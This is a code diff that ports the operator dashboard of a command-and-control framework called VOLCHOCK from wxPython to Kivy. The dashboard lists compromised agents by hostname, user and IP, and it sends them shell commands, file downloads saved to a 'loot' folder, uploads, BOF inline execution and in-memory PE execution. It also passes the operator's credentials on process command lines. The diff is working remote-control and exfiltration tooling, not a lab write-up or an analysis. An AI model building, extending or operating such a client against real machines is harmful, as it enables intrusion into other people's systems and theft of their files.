@@ -1,217 +1,391 @@
-import wx
-import threading
-import os
-import time
-import base64
+from kivy.uix.screenmanager import Screen
+from kivy.uix.boxlayout import BoxLayout
+from kivy.uix.label import Label
+from kivy.uix.image import Image
+from kivy.uix.textinput import TextInput
+from kivy.uix.button import Button
+from kivy.uix.recycleview import RecycleView
+from kivy.uix.recycleboxlayout import RecycleBoxLayout
+from kivy.uix.gridlayout import GridLayout
+from kivy.uix.scrollview import ScrollView
+from kivy.utils import get_color_from_hex
+from kivy.clock import Clock
+from kivy.core.text import LabelBase
+from kivy.uix.popup import Popup
+import threading, requests, os, time, subprocess
 from datetime import datetime
-import requests
+from constants.colors import RED, GREEN, GRAY, WHITE, INPUT_GRAY, BUTTON_GREEN, BUTTON_DARKBLUE
+from kivy.graphics import Color, Rectangle
+from threading import Thread
+import base64
+import subprocess
+import sys
+import json
+import os
 
-from constants.colors import RED, GRAY, WHITE, INPUT_GRAY
-from utils.requests_utils import queue_shell_command
+MAX_CONSOLE_LINES = 100000
 
-class MainFrame(wx.Frame):
-    def __init__(self, base_url, auth, agents):
-        super().__init__(parent=None, title="VOLCHOCK CLIENT", size=(900, 600))
-        self.SetBackgroundColour(WHITE)
+def get_font_path():
+    return os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'assets', 'font.ttf'))
+
+def get_logo_path():
+    return os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'assets', 'logo.jpg'))
+
+class ColoredBox(BoxLayout):
+    def __init__(self, bgcolor, **kwargs):
+        super().__init__(**kwargs)
+        with self.canvas.before:
+            Color(*bgcolor)
+            self.bg_rect = Rectangle(pos=self.pos, size=self.size)
+        self.bind(pos=self._update_rect, size=self._update_rect)
+    def _update_rect(self, *a):
+        self.bg_rect.pos = self.pos
+        self.bg_rect.size = self.size
+
+class AgentListView(BoxLayout):
+    def __init__(self, agents=None, **kwargs):
+        super().__init__(orientation='vertical', **kwargs)
+        self.button_panel = GridLayout(cols=1,
+            size_hint=(1, None),
+            spacing=5
+        )
+        self.button_panel.bind(minimum_height=self.button_panel.setter('height'))
+        sv = ScrollView(size_hint=(1, 1))
+        sv.add_widget(self.button_panel)
+        self.add_widget(sv)
+        self.selected_idx = None
+        self.select_callback = None
+        self.update_agents(agents or [])
+
+    def _update_text_size(self, instance, value):
+        instance.text_size = (instance.width, None)
+
+    def update_agents(self, agents):
+        self.button_panel.clear_widgets()
+        if not agents:
+            btn = Button(
+                text='', 
+                size_hint_y=None, height=38,
+                color=RED, background_color=GREEN, disabled=True
+            )
+            self.button_panel.add_widget(btn)
+        else:
+            for idx, ag in enumerate(agents):
+                txt = f"{ag.get('hostname','?')} ({ag.get('username','?')})"
+                btn = Button(
+                    text=txt,
+                    size_hint_y=None, height=38,
+                    color=WHITE,
+                    background_color=GREEN if idx == self.selected_idx else GREEN,
+                    halign='left'
+                )
+                btn.bind(on_release=self.make_callback(idx))
+                self.button_panel.add_widget(btn)
+
+    def make_callback(self, idx):
+        def cb(instance):
+            self.selected_idx = idx
+            self.update_selected()
+            if self.select_callback:
+                self.select_callback(idx)
+        return cb
+
+    def update_selected(self):
+        for idx, btn in enumerate(self.button_panel.children[::-1]):  # .children est inversé
+            btn.background_color = BUTTON_GREEN if idx == self.selected_idx else BUTTON_GREEN
+
+class AgentInfoPanel(BoxLayout):
+    def __init__(self, **kwargs):
+        super().__init__(orientation='vertical', **kwargs)
+        self.info_label = Label(
+            text='Infos agent :',
+            halign='left',
+            valign='top',
+            size_hint=(1, 1),
+            color=WHITE
+        )
+        self.info_label.bind(size=self._update_text_size)
+        self.add_widget(self.info_label)
+
+    def _update_text_size(self, instance, value):
+        instance.text_size = (instance.width, None)
+
+    def update_infos(self, agent):
+        if not agent:
+            self.info_label.text = ""
+        else:
+            last_seen = datetime.fromtimestamp(agent.get('last_seen',0)).strftime('%Y-%m-%d %H:%M:%S')
+            self.info_label.text = (
+                f"\nAgent ID: {agent.get('agent_id', '?')}\n"
+                f"Hostname: {agent.get('hostname', '?')}\n"
+                f"User: {agent.get('username', '?')}\n"
+                f"IP: {agent.get('ip', '?')}\n"
+                f"Last seen: {last_seen}\n"
+            )
+
+class MainFrame(Screen):
+    def __init__(self, base_url, auth, agents, **kwargs):
+        super().__init__(**kwargs)
         self.base_url = base_url
         self.auth = auth
-        self._agents = agents
-        self.last_results = {}
-        vbox = wx.BoxSizer(wx.VERTICAL)
-        logo_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '.', '..', 'assets', 'logo.jpg'))
-        font_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '.', '..', 'assets', 'font.ttf'))
+        self._agents = agents or []
+        self.selected_agent_idx = 0 if self._agents else None
+        self._last_result_poll_agentid = None
+        self._background_thread_started = False
+        self.console_history = []
+        root = BoxLayout(orientation='vertical', padding=[12,8], spacing=6)
+        # Header
+        header = BoxLayout(orientation='horizontal', size_hint_y=None, height=70, spacing=14)
+        logo_path = get_logo_path()
         if os.path.exists(logo_path):
-            img = wx.Image(logo_path, wx.BITMAP_TYPE_ANY)
-            img = img.Scale(100, 100, wx.IMAGE_QUALITY_HIGH)
-            bmp = wx.Bitmap(img)
-            if bmp.IsOk():
-                logo_bitmap = wx.StaticBitmap(self, bitmap=bmp)
-                vbox.Add(logo_bitmap, flag=wx.ALIGN_CENTER | wx.TOP, border=16)
-            else:
-                vbox.Add(wx.StaticText(self, label="VOLCHOCK"), flag=wx.ALIGN_CENTER | wx.TOP, border=16)
+            header.add_widget(Image(source=logo_path, size_hint=(None,1), width=61))
         else:
-            vbox.Add(wx.StaticText(self, label="VOLCHOCK"), flag=wx.ALIGN_CENTER | wx.TOP, border=16)
-        main_title = wx.StaticText(self, label="VOLCHOCK DASHBOARD")
-        main_title.SetForegroundColour(RED)
+            header.add_widget(Label(text="VOLCHOCK", size_hint=(None,1), width=61))
+        font_path = get_font_path()
+        font_face = None
         if os.path.exists(font_path):
-            try:
-                wx.Font.AddPrivateFont(font_path)
-                font_face_name = "Regular Earth"
-                font = wx.Font(28, wx.FONTFAMILY_DEFAULT, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_BOLD, False, font_face_name)
-                main_title.SetFont(font)
-            except Exception as e:
-                default_font = main_title.GetFont()
-                default_font.SetPointSize(32)
-                default_font.SetWeight(wx.FONTWEIGHT_BOLD)
-                main_title.SetFont(default_font)
-        else:
-            default_font = main_title.GetFont()
-            default_font.SetPointSize(32)
-            default_font.SetWeight(wx.FONTWEIGHT_BOLD)
-            main_title.SetFont(default_font)
-        vbox.Add(main_title, flag=wx.ALIGN_CENTER_HORIZONTAL | wx.TOP | wx.BOTTOM, border=6)
-        splitter = wx.SplitterWindow(self, style=wx.SP_LIVE_UPDATE)
-        splitter.SetMinimumPaneSize(50)
-        splitter.SetMinSize((900, 150))
-        splitter.SetBackgroundColour(GRAY)
-        left_panel = wx.Panel(splitter)
-        left_panel.SetBackgroundColour(GRAY)
-        left_sizer = wx.BoxSizer(wx.VERTICAL)
-        self.agent_list = wx.ListBox(
-            left_panel,
-            choices=[f"{ag['agent_id']} ({ag['hostname']})" for ag in agents]
+            LabelBase.register(name="CustomFont", fn_regular=font_path)
+            font_face = "CustomFont"
+        title = Label(
+            text='VOLCHOCK DASHBOARD',
+            color=RED,
+            font_name=font_face if font_face else None,
+            font_size=30, bold=True,
+            halign='left', valign='middle'
         )
-        self.agent_list.Bind(wx.EVT_LISTBOX, self.on_agent_selected)
-        self.agent_list.SetBackgroundColour(INPUT_GRAY)
-        self.agent_list.SetForegroundColour(WHITE)
-        left_sizer.Add(self.agent_list, 1, wx.EXPAND | wx.ALL, 4)
-        left_panel.SetSizer(left_sizer)
-        right_panel = wx.Panel(splitter)
-        right_panel.SetBackgroundColour(GRAY)
-        right_sizer = wx.BoxSizer(wx.VERTICAL)
-        margin_panel = wx.Panel(right_panel)
-        margin_panel.SetBackgroundColour(INPUT_GRAY)
-        margin_sizer = wx.BoxSizer(wx.VERTICAL)
-        self.agent_info_panel = wx.Panel(margin_panel)
-        self.agent_info_panel.SetBackgroundColour(INPUT_GRAY)
-        self.agent_info_sizer = wx.FlexGridSizer(0, 2, 8, 10)
-        self.agent_info_panel.SetSizer(self.agent_info_sizer)
-        margin_sizer.Add(self.agent_info_panel, 1, wx.EXPAND | wx.ALL, 0)
-        margin_panel.SetSizer(margin_sizer)
-        right_sizer.Add(margin_panel, 1, wx.EXPAND | wx.ALL, 18)
-        right_panel.SetSizer(right_sizer)
-        splitter.SplitVertically(left_panel, right_panel, sashPosition=450)
-        splitter.SetSize((900, 450))
-        splitter.SetSashPosition(450)
-        vbox.Add(splitter, 0, wx.EXPAND | wx.ALL, 2)
-        cmd_panel = wx.Panel(self)
-        cmd_panel.SetBackgroundColour(GRAY)
-        cmd_vbox = wx.BoxSizer(wx.VERTICAL)
-        self.output = wx.TextCtrl(cmd_panel, style=wx.TE_MULTILINE | wx.TE_READONLY | wx.HSCROLL)
-        self.output.SetBackgroundColour(INPUT_GRAY)
-        self.output.SetForegroundColour(WHITE)
-        cmd_vbox.Add(self.output, 2, wx.EXPAND | wx.LEFT | wx.RIGHT | wx.TOP, 5)
-        hbox = wx.BoxSizer(wx.HORIZONTAL)
-        self.cmd_txt = wx.TextCtrl(cmd_panel, style=wx.TE_PROCESS_ENTER)
-        self.cmd_txt.SetBackgroundColour(INPUT_GRAY)
-        self.cmd_txt.SetForegroundColour(WHITE)
-        self.cmd_txt.Bind(wx.EVT_TEXT_ENTER, self.on_shell_command)
-        self.send_btn = wx.Button(cmd_panel, label="Send")
-        self.send_btn.SetForegroundColour(RED)
-        self.send_btn.Bind(wx.EVT_BUTTON, self.on_shell_command)
-        hbox.Add(self.cmd_txt, 1, wx.EXPAND | wx.ALL, 2)
-        hbox.Add(self.send_btn, 0, wx.ALL, 2)
-        cmd_vbox.Add(hbox, 0, wx.EXPAND | wx.ALL, 2)
-        cmd_panel.SetSizer(cmd_vbox)
-        vbox.Add(cmd_panel, 1, wx.EXPAND | wx.ALL, 2)
-        self.agent_refresh_timer = wx.Timer(self)
-        self.Bind(wx.EVT_TIMER, self.on_auto_refresh, self.agent_refresh_timer)
-        self.agent_refresh_timer.Start(5000)
-        self.SetSizer(vbox)
-        self.Centre()
+        header.add_widget(title)
+        buttons = BoxLayout(orientation='vertical', size_hint=(None,1), width=200, height=75, spacing=0)
+        btn_users_logs = Button(
+            text='Users logs',
+            size_hint=(None, None), size=(200, 36),
+            background_color=BUTTON_DARKBLUE,
+            color=WHITE
+        )
+        btn_users_logs.bind(on_press=self.open_users_logs_window)
+        buttons.add_widget(btn_users_logs)
+        btn_logs = Button(
+            text='Logs',
+            size_hint=(None, None), size=(200, 36),
+            background_color=BUTTON_DARKBLUE,
+            color=WHITE
+        )
+        btn_logs.bind(on_press=self.open_logs_window)
+        buttons.add_widget(btn_logs)
+        header.add_widget(buttons)
+        root.add_widget(header)
+        H = BoxLayout(orientation='horizontal', size_hint_y=0.33, spacing=8)
+        agents_list_box = ColoredBox(bgcolor=GRAY, orientation='vertical', padding=3, spacing=3)
+        self.rv_agents = AgentListView(agents=self._agents)
+        self.rv_agents.select_callback = self.on_agent_selected
+        agents_list_box.add_widget(Label(text="[b] Connected agents [/b]",markup=True, color=WHITE, size_hint_y=None, height=22))
+        agents_list_box.add_widget(self.rv_agents)
+        H.add_widget(agents_list_box)
+        infos_box = ColoredBox(bgcolor=GRAY, orientation='vertical', padding=3, spacing=3)
+        self.agent_info = AgentInfoPanel()
+        self.agent_info.update_infos(self._agents[0] if self._agents else None)
+        infos_box.add_widget(Label(text="[b] Agent infos [/b]", markup=True, color=WHITE, size_hint_y=None, height=22))
+        infos_box.add_widget(self.agent_info)
+        H.add_widget(infos_box)
+        root.add_widget(H)
+        console_box = ColoredBox(bgcolor=GRAY, orientation='vertical', spacing=4, padding=6)
+        self.console_textinput = TextInput(
+            text='',
+            multiline=True,
+            readonly=True,
+            font_size=14, 
+            background_color=(0, 0, 0, 1),
+            foreground_color=(1, 1, 1, 1),
+            size_hint=(1, None),
+            height=400
+        )
+        scrollview = ScrollView(
+            size_hint=(1, 1),
+            bar_width=10,
+            bar_color=RED,
+            bar_inactive_color=GRAY,
+            scroll_type=['bars', 'content']
+        )
+        scrollview.add_widget(self.console_textinput)
+        console_box.add_widget(scrollview)
+        prompt_box = BoxLayout(orientation='horizontal', size_hint_y=0.12, spacing=6)
+        self.cmd_txt = TextInput(hint_text="Command input", size_hint_x=0.86, background_color=INPUT_GRAY, foreground_color=WHITE, multiline=False)
+        send_btn = Button(text="Send", size_hint_x=0.14, background_color=[.15,.44,.22,1])
+        send_btn.bind(on_press=self.on_shell_command)
+        prompt_box.add_widget(self.cmd_txt)
+        prompt_box.add_widget(send_btn)
+        console_box.add_widget(prompt_box)
+        root.add_widget(console_box)
+        self.add_widget(root)
+        self.cmd_txt.bind(on_text_validate=self.on_shell_command)
+
+    def open_users_logs_window(self, instance):
+        auth_info = {"username": self.auth.username, "password": self.auth.password}
+        os.environ["KIVY_NO_ARGS"]="1"
+        subprocess.Popen([
+            sys.executable, "-m", "ui.get_users_logs",
+            "--base-url", self.base_url,
+            "--auth", json.dumps(auth_info)
+        ])
+
+    def open_logs_window(self, instance):
+        auth_info = {"username": self.auth.username, "password": self.auth.password}
+        os.environ["KIVY_NO_ARGS"]="1"
+        subprocess.Popen([
+            sys.executable, "-m", "ui.get_logs",
+            "--base-url", self.base_url,
+            "--auth", json.dumps(auth_info)
+        ])
+
+    def append_to_console(self, txt):
+        if not hasattr(self, "console_history"):
+            self.console_history = []
+        lines = txt.splitlines()
+        self.console_history.extend(lines)
+        to_display = self.console_history[-1000:]  
+        self.console_textinput.text = "\n".join(to_display)
+        self.console_textinput.cursor = (0, len(self.console_textinput.text))
+
+    def on_enter(self, *a):
+        if not self._background_thread_started:
+            self._background_thread_started = True
+            threading.Thread(target=self._background_update_loop, daemon=True).start()
+            print("[+] Starting background tasks...") 
+
+    def _background_update_loop(self):
+        while True:
+            try:
+                # 1. Update agents list
+                resp = requests.get(f"{self.base_url}/agents", auth=self.auth, timeout=10)
+                agents_list = resp.json().get("agents", []) if resp.ok else []
+                agents = []
+                for ag in agents_list:
+                    agid = ag.get("agent_id")
+                    try:
+                        r = requests.get(f"{self.base_url}/agent/{agid}/info", auth=self.auth, timeout=8)
+                        if r.ok:
+                            ag_detail = r.json().get("info", {})
+                            ag_detail["agent_id"] = agid
+                            agents.append(ag_detail)
+                    except Exception as e:
+                        print(f"Error agent fetch: {e}")
+                Clock.schedule_once(lambda dt: self._safe_update_agents(agents))
+                # 2. Update agent info panel
+                if agents and self.selected_agent_idx is not None and 0 <= self.selected_agent_idx < len(agents):
+                    agid = agents[self.selected_agent_idx]['agent_id']
+                    try:
+                        inf = requests.get(f"{self.base_url}/agent/{agid}/info", auth=self.auth, timeout=8)
+                        agent = inf.json().get("info", {}) if inf.ok else None
+                        Clock.schedule_once(lambda dt: self.agent_info.update_infos(agent))
+                    except Exception as e:
+                        print(f"Error agent info: {e}")
+                # 3. Update results panel
+                if agents and self.selected_agent_idx is not None and 0 <= self.selected_agent_idx < len(agents):
+                    agid = agents[self.selected_agent_idx]['agent_id']
+                    try:
+                        res = requests.get(f"{self.base_url}/agent/{agid}/results", auth=self.auth, timeout=8)
+                        if res.ok:
+                            results = res.json().get("results", [])
+                            if results:
+                                Clock.schedule_once(lambda dt: self.append_to_console("\n[Results]:\n" + "\n".join(results) ))
+                    except Exception as e:
+                        print(f"Error agent results: {e}")
+            except Exception as e:
+                print(f"Background update error: {e}")
+            time.sleep(1) 
+
+    def _safe_update_agents(self, agents):
+        self._agents = agents
+        self.rv_agents.update_agents(agents)
         if agents:
-            self.agent_list.SetSelection(0)
-            self.show_agent_info(agents[0])
+            if self.selected_agent_idx is None or not (0 <= self.selected_agent_idx < len(agents)):
+                self.selected_agent_idx = 0
+            self.rv_agents.selected_idx = self.selected_agent_idx
+            agent = agents[self.selected_agent_idx]
+            self.agent_info.update_infos(agent)
         else:
-            self.clear_agent_info()
+            self.selected_agent_idx = None
+            self.agent_info.update_infos(None)
 
-    def clear_agent_info(self):
-        for child in self.agent_info_panel.GetChildren():
-            child.Destroy()
-        self.agent_info_sizer.Clear()
-        self.agent_info_panel.Layout()
+    def on_agent_selected(self, idx):
+        self.selected_agent_idx = idx
+        if self._agents and 0 <= idx < len(self._agents):
+            self.agent_info.update_infos(self._agents[idx])
+            Clock.schedule_once(lambda dt: self.append_to_console(f"\n[+] Selected agent: {self._agents[idx]['hostname']} ({self._agents[idx]['username']})"))
 
-    def on_auto_refresh(self, event):
+    def get_downloaded_file(self, agent_id, payload_cmd):
         try:
-            resp = requests.get(f"{self.base_url}/agents", auth=self.auth, timeout=3)
-            if resp.ok:
-                agents = resp.json().get("agents", [])
-                cur_sel = self.agent_list.GetSelection()
-                cur_sel_id = None
-                if cur_sel != wx.NOT_FOUND and cur_sel < len(self._agents):
-                    cur_sel_id = self._agents[cur_sel].get('agent_id', None)
-                self._agents = agents
-                self.agent_list.Clear()
-                self.agent_list.AppendItems([f"{ag['agent_id']} ({ag['hostname']})" for ag in agents])
-                sel_index = 0
-                if cur_sel_id:
-                    for idx, ag in enumerate(agents):
-                        if ag.get('agent_id', None) == cur_sel_id:
-                            sel_index = idx
-                            break
-                if agents:
-                    self.agent_list.SetSelection(sel_index)
-                    self.show_agent_info(agents[sel_index])
-                else:
-                    self.clear_agent_info()
-            else:
-                self.output.AppendText(f"[!] Error while refreshing: {resp.status_code}\n")
+            time_out = 60
+            while time_out > 0:
+                resp = requests.get(f"{self.base_url}/agent/{agent_id}/results", auth=self.auth, timeout=3)
+                if resp.ok:
+                    results = resp.json().get("results", [])
+                    if len(results) > 0:
+                        latest = results[0]
+                        loot_dir = 'loot'
+                        if not os.path.exists(loot_dir):
+                            os.makedirs(loot_dir)
+                        agent_dir = os.path.join('loot', str(agent_id))
+                        if not os.path.exists(agent_dir):
+                            os.makedirs(agent_dir)
+                        if '\\' in payload_cmd:
+                            filename = payload_cmd.split('\\')[-1]
+                        else:
+                            filename = os.path.basename(os.path.normpath(payload_cmd))
+                        dest_path = os.path.join(agent_dir, filename)
+                        with open(dest_path, 'wb') as f:
+                            f.write(base64.b64decode(latest))
+                        Clock.schedule_once(lambda dt: self.append_to_console(f"[+] File saved : {dest_path} \n\n" ))
+                        time_out = 0
+                        return
+                time_out = time_out - 1
+                time.sleep(1)
+            Clock.schedule_once(lambda dt: self.append_to_console("[!] Timeout, no result received.\n"))
         except Exception as e:
-            self.output.AppendText(f"[!] Exception: {e}\n")
+            print(f"[!] Exception: {e}\n")
 
-    def on_agent_selected(self, event):
-        idx = self.agent_list.GetSelection()
-        if idx != wx.NOT_FOUND and idx < len(self._agents):
-            self.show_agent_info(self._agents[idx])
-        else:
-            self.clear_agent_info()
-
-    def show_agent_info(self, agent):
-        for child in self.agent_info_panel.GetChildren():
-            child.Destroy()
-        self.agent_info_sizer.Clear()
-        last_seen = agent.get('last_seen', '')
+    def get_upload_result(self, agent_id):
         try:
-            last_seen_str = datetime.fromtimestamp(last_seen).strftime('%Y-%m-%d %H:%M:%S') if last_seen else ''
-        except:
-            last_seen_str = str(last_seen)
-        fields = [
-            ("ID", agent.get('agent_id', '')),
-            ("Hostname", agent.get('hostname', '')),
-            ("User", agent.get('username', '')),
-            ("IP", agent.get('ip', '')),
-            ("Last seen", last_seen_str)
-        ]
-        label_font = wx.Font(wx.FontInfo(10).Bold())
-        for label, value in fields:
-            static_label = wx.StaticText(self.agent_info_panel, label=label + " :")
-            static_label.SetForegroundColour(WHITE)
-            static_label.SetFont(label_font)
-            static_value = wx.StaticText(self.agent_info_panel, label=str(value))
-            static_value.SetForegroundColour(WHITE)
-            self.agent_info_sizer.Add(static_label, 0, wx.ALIGN_LEFT | wx.ALIGN_CENTER_VERTICAL)
-            self.agent_info_sizer.Add(static_value, 0, wx.EXPAND)
-        self.agent_info_panel.Layout()
+            time_out = 60
+            while time_out > 0:
+                resp = requests.get(f"{self.base_url}/agent/{agent_id}/results", auth=self.auth, timeout=3)
+                if resp.ok:
+                    results = resp.json().get("results", [])
+                    if len(results) > 0:
+                        Clock.schedule_once(lambda dt: self.append_to_console("[+] File sent.\n"))
+                        return
+                time_out = time_out - 1
+                time.sleep(1)
+        except Exception as e:
+            Clock.schedule_once(lambda dt: self.append_to_console(f"[!] Exception: {e}\n"))
 
-    def on_shell_command(self, event):
-        selection = self.agent_list.GetSelection()
-        if selection == wx.NOT_FOUND or not self._agents:
-            self.output.AppendText("[!] Please select an agent.\n")
-            self.cmd_txt.SetValue("")
+    def on_shell_command(self, _):
+        idx = self.rv_agents.selected_idx
+        if idx is None or not self._agents:
+            Clock.schedule_once(lambda dt: self.append_to_console("\n[!] Please select an agent."))
+            self.cmd_txt.text = ""
             return
-        cmd = self.cmd_txt.GetValue().strip()
+        cmd = self.cmd_txt.text.strip()
         if not cmd:
-            self.output.AppendText("[!] Please enter a command.\n")
-            self.cmd_txt.SetValue("")
+            Clock.schedule_once(lambda dt: self.append_to_console("\n"))
+            self.cmd_txt.text = ""
             return
-        agent = self._agents[selection]
+        agent = self._agents[idx]
         agent_id = agent['agent_id']
+        try: from utils.requests_utils import queue_shell_command
+        except Exception:
+            def queue_shell_command(*a,**k): pass
         if cmd.lower().startswith("shell "):
-            payload_cmd = cmd[len("shell "):].strip()
-            display_cmd = str({"cmd": f"{payload_cmd}"})
-            resp = queue_shell_command(self.base_url, agent_id, display_cmd, self.auth)
-            self.output.AppendText(f"[+] Shell command sent: {payload_cmd} \n")
-            self.cmd_txt.SetValue("[+] Retrieving command result...")
-            wx.Yield()
-            threading.Thread(target=self.thread_get_shell_result, args=(agent_id,)).start()
+            payload_cmd = cmd[6:].strip()
+            display_cmd = str({"cmd": payload_cmd})
+            queue_shell_command(self.base_url, agent_id, display_cmd, self.auth)
+            Clock.schedule_once(lambda dt: self.append_to_console(f"\n[+] Shell command sent: {payload_cmd}\n[~] Waiting result ..."))
+            self._last_result_poll_agentid = agent_id
         elif cmd.lower().startswith("download "):
+            Clock.schedule_once(lambda dt: self.append_to_console(f"[+] Trying to download file: {payload_cmd} \n"))
             payload_cmd = cmd[len("download "):].strip()
             display_cmd = str({"download": f"{payload_cmd}"})
             resp = queue_shell_command(self.base_url, agent_id, display_cmd, self.auth)
-            self.output.AppendText(f"[+] Trying to download file: {payload_cmd} \n")
-            self.cmd_txt.SetValue("[+] Retrieving file data...")
-            wx.Yield()
-            self.get_downloaded_file(agent_id, payload_cmd)
+            Thread(target=self.get_downloaded_file, args=(agent_id, payload_cmd)).start()
         elif cmd.lower().startswith("upload "):
             payload_cmd = cmd[len("upload "):].strip()
             with open(payload_cmd, 'rb') as f:
@@ -220,10 +394,18 @@ class MainFrame(wx.Frame):
             filename = os.path.basename(payload_cmd)
             fil_props = base64.b64encode(str({"filename": filename, "content": b64_encoded_file}).encode("utf-8", errors="replace"))
             display_cmd = str({"upload": fil_props})
-            self.output.AppendText(f"[+] Trying to upload file: {payload_cmd} \n")
+            Clock.schedule_once(lambda dt: self.append_to_console(f"[+] Trying to upload file: {payload_cmd} \n"))
             resp = queue_shell_command(self.base_url, agent_id, display_cmd, self.auth)
-            self.output.AppendText("[+] File sent.\n")
-            threading.Thread(target=self.thread_get_upload_result, args=(agent_id,)).start()
+            threading.Thread(target=self.get_upload_result, args=(agent_id,)).start()
+        elif cmd.lower().startswith("inline-execute "):
+            payload_cmd = cmd[len("inline-execute "):].strip()
+            with open(payload_cmd, 'rb') as f:
+                file_content = f.read()
+            b64_encoded_file = base64.b64encode(file_content).decode()
+            display_cmd = str({"inline-execute": b64_encoded_file})
+            Clock.schedule_once(lambda dt: self.append_to_console(f"[+] Trying to execute BOF: {payload_cmd} \n"))
+            resp = queue_shell_command(self.base_url, agent_id, display_cmd, self.auth)
+            threading.Thread(target=self.get_upload_result, args=(agent_id,)).start()
         elif cmd.lower().startswith("exec-pe "):
             cmd_args = cmd[len("exec-pe "):].strip().split(" ")
             payload_cmd = cmd_args[0]
@@ -239,10 +421,9 @@ class MainFrame(wx.Frame):
                 "args": b64_encoded_args
             }).encode("utf-8", errors="replace"))
             display_cmd = str({"exec-pe": fil_props})
-            self.output.AppendText(f"[+] Trying to execute PE in-memory: {payload_cmd} \n")
+            Clock.schedule_once(lambda dt: self.append_to_console(f"[+] Trying to execute PE in-memory: {payload_cmd} \n"))
             resp = queue_shell_command(self.base_url, agent_id, display_cmd, self.auth)
-            self.output.AppendText("[+] PE sent for execution.\n")
-            threading.Thread(target=self.thread_get_upload_result, args=(agent_id,)).start()
+            threading.Thread(target=self.get_upload_result, args=(agent_id,)).start()
         else:
             display_help = """
 Available Commands:
@@ -263,75 +444,5 @@ Available Commands:
     In-memory execution of a local PE on the target machine.
     Example: exec-pe /home/user/payload.exe
 """
-            self.output.AppendText(display_help + "\n")
-        self.cmd_txt.SetValue("")
-
-    # THREADING & BACKEND LOGIC
-    def thread_get_shell_result(self, agent_id):
-        self.get_shell_result(agent_id)
-        wx.CallAfter(self.cmd_txt.SetValue, "")
-
-    def get_shell_result(self, agent_id):
-        try:
-            time_out = 60
-            while time_out > 0:
-                resp = requests.get(f"{self.base_url}/agent/{agent_id}/results", auth=self.auth, timeout=3)
-                if resp.ok:
-                    results = resp.json().get("results", [])
-                    if len(results) > 0:
-                        def show_results():
-                            self.output.AppendText(f"\n[Result]:\n")
-                            for res in results:
-                                self.output.AppendText(f"{res}\n")
-                        wx.CallAfter(show_results)
-                        return
-                time_out = time_out - 1
-                time.sleep(1)
-            wx.CallAfter(self.output.AppendText, "[!] Timeout, no result received.\n")
-        except Exception as e:
-            wx.CallAfter(self.output.AppendText, f"[!] Exception: {e}\n")
-
-    def get_downloaded_file(self, agent_id, payload_cmd):
-        try:
-            time_out = 60
-            while time_out > 0:
-                resp = requests.get(f"{self.base_url}/agent/{agent_id}/results", auth=self.auth, timeout=3)
-                if resp.ok:
-                    results = resp.json().get("results", [])
-                    if len(results) > 0:
-                        latest = results[0]
-                        loot_dir = 'loot'
-                        if not os.path.exists(loot_dir):
-                            os.makedirs(loot_dir)
-                        agent_dir = os.path.join('loot', str(agent_id))
-                        if not os.path.exists(agent_dir):
-                            os.makedirs(agent_dir)
-                        filename = os.path.basename(payload_cmd)
-                        dest_path = os.path.join(agent_dir, filename)
-                        with open(dest_path, 'wb') as f:
-                            f.write(base64.b64decode(latest))
-                        self.output.AppendText(f"[+] File saved : {dest_path} \n\n")
-                        time_out = 0
-                        return
-                time_out = time_out - 1
-                time.sleep(1)
-            self.output.AppendText("[!] Timeout, no result received.\n")
-        except Exception as e:
-            self.output.AppendText(f"[!] Exception: {e}\n")
-
-    def thread_get_upload_result(self, agent_id):
-        self.get_upload_result(agent_id)
-
-    def get_upload_result(self, agent_id):
-        try:
-            time_out = 60
-            while time_out > 0:
-                resp = requests.get(f"{self.base_url}/agent/{agent_id}/results", auth=self.auth, timeout=3)
-                if resp.ok:
-                    results = resp.json().get("results", [])
-                    if len(results) > 0:
-                        return
-                time_out = time_out - 1
-                time.sleep(1)
-        except Exception as e:
-            wx.CallAfter(self.output.AppendText, f"[!] Exception: {e}\n")
+            Clock.schedule_once(lambda dt: self.append_to_console(f"\n{display_help}\n"))
+        self.cmd_txt.text = ""
